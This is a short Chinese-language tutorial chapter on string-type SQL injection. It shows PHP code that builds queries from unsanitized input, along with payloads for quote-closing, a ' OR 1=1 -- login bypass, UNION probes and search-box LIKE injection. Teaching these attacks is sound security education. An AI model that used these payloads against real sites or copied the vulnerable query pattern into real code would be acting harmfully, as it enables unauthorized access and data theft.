# 字符型 SQL 注入

## 原理

当参数是字符串类型时，SQL 语句会用引号包裹用户输入：

```php
$username = $_POST['username'];
$sql = "SELECT * FROM users WHERE username = '$username'";
```

要注入这种查询，需要先闭合引号。

## 攻击步骤

### 第一步：确认漏洞

输入 `admin'`，如果报错，说明存在字符型注入。

### 第二步：闭合引号并注释

```
admin' OR '1'='1' --
admin' OR '1'='1' #
admin' OR '1'='1' /*
```

最终 SQL 变成：
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'
```

### 第三步：万能密码

```
' OR 1=1 --
```

这将绕过登录验证，因为 `WHERE '' OR 1=1` 永远为真。

### 第四步：UNION 查询

```
' UNION SELECT 1,2,3,4,5 --
```

## 搜索型注入

搜索框通常使用 LIKE 语句：

```php
$keyword = $_GET['keyword'];
$sql = "SELECT * FROM products WHERE name LIKE '%$keyword%'";
```

注入方式：
```
%' OR 1=1 --
%' UNION SELECT 1,2,3,4,5 --
```

## 关键知识点

- **引号闭合** — 字符型注入的核心技巧
- **注释符** — `--`、`#`、`/*` 用于注释掉后续代码
- **万能密码** — `' OR 1=1 --` 绕过登录
- **搜索型注入** — LIKE 语句中的注入

## 下一步

[学习盲注技术 →](./04-blind-injection.md)
